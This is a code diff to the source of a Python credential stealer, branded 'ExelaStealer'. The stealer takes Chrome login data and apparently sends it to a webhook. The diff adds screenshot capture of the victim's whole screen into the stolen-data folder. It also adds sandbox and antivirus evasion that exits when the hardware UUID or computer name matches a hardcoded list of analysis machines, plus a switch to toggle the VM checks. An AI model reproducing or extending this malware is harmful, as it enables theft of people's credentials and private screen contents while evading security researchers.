@@ -1,10 +1,12 @@
-import sqlite3, ctypes
+import sqlite3, ctypes, mss, sys
 import os, wmi, win32api, platform, uuid, psutil
 import shutil
 import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
 from Crypto.Cipher import AES
 
 UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'[::-1]
+Anti_Vm = "%AnTiVm%"
+
 
 
 class ChromeLoginData:
@@ -695,6 +697,12 @@ class ChromeLoginData:
                     q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
                     for gw in self.growtopiaa:
                         q.write(str(gw) + "\n")
+            if 5 < 10:
+                with mss.mss() as sct:
+                    monitor = sct.monitors[0]
+                    width = monitor["width"]
+                    height = monitor["height"]
+                    sct.shot(output=tmp + f"\\{run}\\Screenshot.png")
         else:
             os.mkdir(tmp + f"\\{run}")
             if not self.passws == 0:
@@ -775,14 +783,18 @@ class ChromeLoginData:
                     q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
                     for gw in self.growtopiaa:
                         q.write(str(gw) + "\n")
-
-
+            if 5 < 10:
+                with mss.mss() as sct:
+                    monitor = sct.monitors[0]
+                    width = monitor["width"]
+                    height = monitor["height"]
+                    screenshot = sct.shot(output=tmp + f"\\{run}\\Screenshot.png")
 
 class HardAntiVM:
     def __init__(self) -> None:
         if self.is_running_on_vm():
             print("VM Detected")
-            exit()
+            sys.exit(0)
         else:
             print("Normal Machine")
             thread = threading.Thread(target=ChromeLoginData,daemon=True)
@@ -790,7 +802,6 @@ class HardAntiVM:
             thread.join()
     def is_running_on_vm(self):
         detection_methods = [
-        self.antiVT,
         self.normalVM,
         self.vmcik,
         self.check_mac_address,
@@ -875,7 +886,6 @@ class HardAntiVM:
             pass
         return False
     def check_debugger(self):
-    # Debug modunda çalışıp çalışmadığını kontrol etmek için
         if ctypes.windll.kernel32.IsDebuggerPresent():
             return True
         return False
@@ -932,8 +942,10 @@ class HardAntiVM:
             if "vbox" in diskDrive.Caption.lower() or "virtual" in diskDrive.Caption.lower():
                 return True
             else:
-                return False
-    def antiVT(self):
+                return False   
+
+class Antivirüstotal:
+    def __init__(self) -> None:
         command = "wmic csproduct get uuid"
         serialNumber = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
         banned_hwids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
@@ -943,16 +955,22 @@ class HardAntiVM:
                             "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
         for identity in banned_hwids:
             if serialNumber in identity:
-                return True
+                sys.exit(0)
+            else:
+                continue
         for compnames in banned_compname:
             if os.getenv('computername') in compnames:
-                return True
-        return False
-                        
-
+                sys.exit(0)
+            else:
+                continue
+    
                         
 
 if __name__ == "__main__":
-    HardAntiVM()
-    #u can scamm, ah nope u cant scam people i am not responsible any illegal uses
-    # <3 quicaxd, sex
+    Antivirüstotal()
+    if Anti_Vm == "true":
+        thread = threading.Thread(target=ChromeLoginData,daemon=True)
+        thread.start()
+        thread.join()
+    else:
+        HardAntiVM()
